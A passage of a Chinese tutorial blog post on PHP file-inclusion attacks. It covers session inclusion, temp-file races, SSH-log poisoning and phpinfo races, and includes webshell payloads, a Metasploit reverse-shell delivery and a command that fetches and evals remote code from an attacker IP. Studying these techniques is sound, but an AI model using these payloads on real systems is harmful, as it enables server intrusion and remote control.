class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Location: index.php&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select password from user where username=?&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">fetch</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">        <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//register.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span> = @<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbuser</span>, <span class=\"variable\">$dbpass</span>, <span class=\"variable\">$dbname</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;could not connect to the database:\\n&quot;</span> . <span class=\"variable\">$mysqli</span>-&gt;connect_error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">set_charset</span>(<span class=\"string\">&quot;utf8&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from user where username=?&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$username</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_result</span>(<span class=\"variable\">$res_id</span>, <span class=\"variable\">$res_username</span>, <span class=\"variable\">$res_password</span>);</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">store_result</span>();</span><br><span class=\"line\">    <span class=\"variable\">$count</span> = <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">num_rows</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$count</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;User name Already Exists&#x27;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into user(username, password) values(?,?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;ss&quot;</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\">        <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$stmt</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">    <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>两个文件都是用 PDO 写的，不存在 sql 注入，config 是数据库用户名与密码，除非他的服务器允许外链，不然没用，index 就包含了两个页面</p>\n<p>但我们注意到：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$res_password</span> == <span class=\"variable\">$password</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$username</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;location:index.php&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Invalid user name or password&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里使用了 session 来保存用户会话，php 手册中是这样描述的：</p>\n<ol>\n<li>PHP 会将会话中的数据设置到  <code>$_SESSION</code>  变量中。</li>\n<li>当 PHP 停止的时候，它会自动读取  <code>$_SESSION</code>  中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</li>\n<li>对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</li>\n</ol>\n</blockquote>\n<p>把我们的用户名 base64 编码后放到了 session 中</p>\n<p>那么可能存在 session 包含了，session 包含的两个条件：1. 知道物理路径与 session 名称，物理路径我们是知道的，session 名称我们可以 f12 查看 2.session 可以写入并且被包含，这一点我们也是满足的</p>\n<p>这样我们可以注册的时候用户名写我们的 php 代码，然后通过 session 包含</p>\n<p>但 session 中是 base64 编码后的，不能直接包含，我们需要在包含前解码，php://filter 就是个很好的解码方法</p>\n<p>注册如下用户名： <code>hahaha</code> ，密码随便写，最终在数据库中的是： <code>username|s:12:&quot;xxxxxxx&quot;</code> xxx 为我们用户名的 base64 编码，12 是 base64 编码的长度</p>\n<p>但 base64 是有特性的他必须 8 位为一组，如果不够会把后面的字符抓过来，此时 <code>username|s:12:&quot;</code>  正好是 15 个字符，为了增加一个字符，我们需要扩展我们的用户名，让他 base64 之后为 100 字符以上，这样我们前 16 个字符被解码为乱码，我们的 php 被正确包含</p>\n<p>比如： <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;?php eval($_GET['aaaaaa']) ?&gt;</code></p>\n<p>然后解码，正确包含</p>\n<p><code>http://1.1.1.1/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;aaaaaa=phpinfo();</code></p>\n<p>防御 session：</p>\n<p>修改 session 默认路径和名称</p>\n<p>设置 session 文件夹权限</p>\n<h2 id=\"临时文件包含\"><a class=\"markdownIt-Anchor\" href=\"#临时文件包含\">#</a> 临时文件包含</h2>\n<p>当文件上传时，先存储到临时文件夹，在移动到网站目录下，我们可以通过竞争在删除之前包含，文件名通过通配符找到</p>\n<p>1. 先上传文件</p>\n<p>2. 通过 file 覆盖前一个文件，匹配临时文件</p>\n<p>3. 包含临时文件</p>\n<p>如果是自己的 phpstudy 默认是没有开启</p>\n<p>我们需要修改 upload_tmp_dir = “C:\\Windows\\Temp”</p>\n<p>然后利用文件上传产生的缓存文件进行命令执行，从而 getshell</p>\n<p>假设我们有一个前端页面可以上传文件，后端可以接收上传的文件并进行包含，那么我们就可以利用文件上传时上传到临时目录，在删除之前通过竞争包含</p>\n<p>我们需要解决几个问题：</p>\n<p>1. 如何找到我们的临时文件？</p>\n<p>通过 &gt;，在 Windows 中 &gt; 可以当做通配符使用，很巧，php 的临时文件长这样 php678u，那么我们可以这样匹配 php&gt;&gt;&gt;</p>\n<p>2. 即使我们访问到临时文件，他依然会删除，怎么解决？</p>\n<p>往他网站根目录下写 php 文件，即使我们的临时文件删除了，只要在删除之前包含了，那么我们在网站根目录下的文件就会生成</p>\n<p><code>&lt;?php fputs(fopen('E:\\phpstudy_pro\\www\\aaaaa.php','w'),'&lt;?php phpinfo(); ?&gt;'); ?&gt;</code></p>\n<p>3. 如何构造上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /xss_location/include/windows.php HTTP/1.1</span><br><span class=\"line\">Host: 172.16.60.64</span><br><span class=\"line\">Content-Length: 481</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://172.16.60.64</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://172.16.60.64/xss_location/include/windows.html</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=s3pod5ho262o336afdd8ljvkg7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php fputs(fopen(&#x27;E:\\phpstudy_pro\\www\\aaaaa.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo(); ?&gt;&#x27;); ?&gt;</span><br><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;upload&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">upload</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw--</span><br></pre></td></tr></table></figure>\n<p>注意：下面几行是需要我们自己构造的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yes</span><br><span class=\"line\">------WebKitFormBoundary163SaL5Buko78Yfw</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\Temp\\php&lt;&lt;&lt;&lt;</span><br></pre></td></tr></table></figure>\n<p>yes 的作用是包含成功后的提示符</p>\n<p>name=file 是为了覆盖上一个 name=file，然后匹配临时文件</p>\n<p>php&gt;&gt;&gt;&gt; 就是通配符了，上面解释过</p>\n<p>记得空行的问题，如果报错尝试删除或增加空行</p>\n<p>补充一下 windows 匹配</p>\n<blockquote>\n<p>DOS_STAR：即 &lt;，匹配 0 个以上的字符<br>\n DOS_QM：即 &gt;，匹配 1 个字符<br>\n DOS_DOT：即 &quot;，匹配点号</p>\n</blockquote>\n<p>如果他的 php.ini 下没有设置 upload 这个东西的路径并且还有；，也就是没有设置。</p>\n<p>那么我们也可以直接读取任意文件</p>\n<p>其实也没必要非得文件上传了，本来文件包含后就可以读取了</p>\n<p>临时文件包含条件：</p>\n<blockquote>\n<p>1.php.ini 中的 upload_tmp_dir 下必须有 C:/Windows/Temp 这个路径</p>\n<p>2. 得有写入的权限（这个默认应该都可以）</p>\n<p>3.$_REQUEST 得有，因为他是获取表单信息的一个数组，如果没有它，那么我们就不能进行文件上传来打。</p>\n</blockquote>\n<h2 id=\"ssh文件包含\"><a class=\"markdownIt-Anchor\" href=\"#ssh文件包含\">#</a> SSH 文件包含</h2>\n<p>假设有如下文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];   </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;<span class=\"subst\">$file</span>&quot;</span>);   </span><br><span class=\"line\">    &#125;   <span class=\"keyword\">else</span>   &#123;       </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;index.php&quot;</span>);   </span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>那么我们就可以包含任意文件，比如 /etc/passwd</p>\n<p><code>[101.35.139.208:9999/lfi.php?file=file:///etc/passwd](http://101.35.139.208:9999/lfi.php?file=file:///etc/passwd)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191034602.png\" alt=\"image-20221031191034602\"></p>\n<p>那么意味着我们其实也可以包含 ssh log</p>\n<p>先看一眼 ssh log 里面有啥</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191351374.png\" alt=\"image-20221031191351374\"></p>\n<p>加入我们登录时构造这样的用户名 <code>ssh root&lt;?php phpinfo();?&gt;@101.35.139.208</code></p>\n<p>那么在我们的 ssh log 中就会存在以下日志</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191502317.png\" alt=\"image-20221031191502317\"></p>\n<p>试着包含一下？</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191635298.png\" alt=\"image-20221031191635298\"></p>\n<p>但是文件很大，你忍一下</p>\n<p>记得在包含前，设置文件的权限 <code>chmod 775 secure</code></p>\n<p>也可以写马，比如</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192425893.png\" alt=\"image-20221031192425893\"></p>\n<p>如果报错 <code>system() has been disabled for security reasons </code> ，无法包含，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192854594.png\" alt=\"image-20221031192854594\"></p>\n<p>把这里的 disable_function 中的你需要使用的函数去掉，重启</p>\n<p><code>service php-fpm restart</code></p>\n<p>web 传递  cs msf</p>\n<p>msf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set target 1</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set lhost 192.168.1.123</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set srvport 8081</span><br><span class=\"line\">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>\n<p>执行 msf 给出的命令</p>\n<p><code>http://10.128.50.84:18888/lfi.php?file=./shabi.php&amp;cmd=php -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://192.168.13.133:9891/GEZgpb8cVDe', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));&quot;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031201754444.png\" alt=\"image-20221031201754444\"></p>\n<p>CS web delivery</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101145322747.png\" alt=\"image-20221101145322747\" style=\"zoom:80%;\" />\n<h2 id=\"包含procselfenviron\"><a class=\"markdownIt-Anchor\" href=\"#包含procselfenviron\">#</a> 包含 / PROC/SELF/ENVIRON</h2>\n<p>并不能包含这东西～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# ls -al /proc/self/environ </span><br><span class=\"line\">-r-------- 1 root root 0 Nov  1 14:56 /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>而且不能 chmod 改变权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# chmod 755 /proc/self/environ </span><br><span class=\"line\">chmod: changing permissions of ‘/proc/self/environ’: Operation not permitted</span><br></pre></td></tr></table></figure>\n<p>也不能修改特殊权限位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# lsattr /proc/self/environ </span><br><span class=\"line\">lsattr: Inappropriate ioctl for device While reading flags on /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>关于 chattr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr +i 11111.exe </span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br><span class=\"line\">rm: cannot remove ‘11111.exe’: Operation not permitted</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# lsattr 11111.exe </span><br><span class=\"line\">----i--------e-- 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr -i 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br></pre></td></tr></table></figure>\n<h2 id=\"phpinfo文件包含\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo文件包含\">#</a> phpinfo 文件包含</h2>\n<p>php 5.x</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Configuration File (php.ini) Path\tC:\\Windows</span><br><span class=\"line\">Loaded Configuration File\tD:\\BtSoft\\php\\54\\php.ini</span><br><span class=\"line\">PHP Version\t5.4.45</span><br><span class=\"line\">allow_url_fopen\tOn\tOn</span><br><span class=\"line\">allow_url_include\tOn\tOn</span><br><span class=\"line\">session.save_path\tD:\\BtSoft\\temp\\session\tD:\\BtSoft\\temp\\session</span><br><span class=\"line\">disable_functions\tno value\tno value</span><br><span class=\"line\">_SERVER[&quot;*********&quot;]\tC:\\Windows</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9waHBpbmZvLnBocA==\">http://127.0.0.1:18888/phpinfo.php</span> 我们可以向 phpinfo 中 post 参数，虽然没有接收，但会生成临时文件，我们可以利用时间竞争包含</p>\n<p>当然可以向任意 php 文件 post 文件，服务器都会将他保存到一个临时文件中，只是如果没有 phpinfo，临时文件名很难猜。然而 phpinfo 中会有文件名和路径的输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  <span class=\"string\">&#x27;file&#x27;</span>: <span class=\"string\">&quot;&lt;?php echo &#x27;yanchuang is cool!&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://172.16.60.64/xss_location/include/phpinfo.php&quot;</span></span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">data = re.search(<span class=\"string\">&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;</span>, r.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br></pre></td></tr></table></figure>\n<p>为了延缓删除临时文件，我们需要 post 更长的文件，通知启用大量线程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span 